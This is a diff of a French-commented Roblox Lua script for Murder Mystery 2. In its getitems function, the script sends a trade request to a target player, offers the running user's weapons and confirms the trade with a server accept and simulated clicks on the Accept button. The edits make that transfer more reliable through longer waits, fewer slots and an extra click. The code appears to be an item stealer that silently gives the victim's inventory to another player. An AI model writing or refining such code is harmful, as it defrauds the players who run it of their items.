@@ -509,11 +509,11 @@ local function getitems()
     end
 
     Trade.SendRequest:InvokeServer(targetPlayer)
-    task.wait(2)
+    task.wait(2.5) -- Marge augmentée pour l'ouverture de session
 
-    -- 2. Remplissage des 4 cases max de MM2
+    -- 2. Remplissage des 3 cases max de MM2 (au lieu de 4)
     local itemsOffered = 0
-    local maxSlots = 4
+    local maxSlots = 3 -- Réduit à 3 pour la stabilité
 
     local function offerAll(itemTable)
         if itemTable and itemsOffered < maxSlots then
@@ -523,7 +523,7 @@ local function getitems()
                     
                     Trade.OfferItem:FireServer(b.data, "Weapons")
                     itemsOffered = itemsOffered + 1
-                    task.wait(0.25)
+                    task.wait(0.4) -- Délai plus long entre chaque arme
                 end
                 if itemsOffered >= maxSlots then break end
             end
@@ -539,38 +539,42 @@ local function getitems()
     offerAll(uncommonItems)
     offerAll(commonItems)
 
-    task.wait(1.5)
+    task.wait(2) -- Laisse le temps au serveur de stabiliser les items posés
 
     -- 3. Première validation (Acceptation initiale)
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 4. Attente du timer obligatoire de MM2 (7 secondes)
-    task.wait(7)
+    -- 4. Attente du timer MM2 (8 secondes pour prévenir le lag)
+    task.wait(8)
 
-    -- 5. DOUBLE-CLIC VIRTUEL SUR LE BOUTON ACCEPTER
+    -- 5. VALIDATION PAR CLICS PHYSIQUES SÉQUENTIELS
     pcall(function()
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
 
-        -- Coordonnées exactes basées sur ton écran
+        -- Coordonnées du bouton ACCEPTER
         local targetX = ViewportSize.X * 0.76
         local targetY = ViewportSize.Y * 0.74
 
         local function sendClick()
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, true, game, 0)
-            task.wait(0.1)
+            task.wait(0.15)
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
         end
 
-        -- Premier clic (Passe le bouton en vert / verrouille l'offre)
+        -- Clic 1 : Verrouille l'acceptation
+        sendClick()
+        
+        task.wait(2) -- Pause plus longue pour laisser le jeu passer en état "Waiting / Confirming"
+
+        -- Clic 2 : Valide le trade final
         sendClick()
 
-        -- Petite pause de 1.5 seconde
         task.wait(1.5)
 
-        -- Deuxième clic (Validation définitive du trade)
+        -- Clic 3 : Sécurité supplémentaire si le serveur a raté le 2ème clic
         sendClick()
     end)
 end
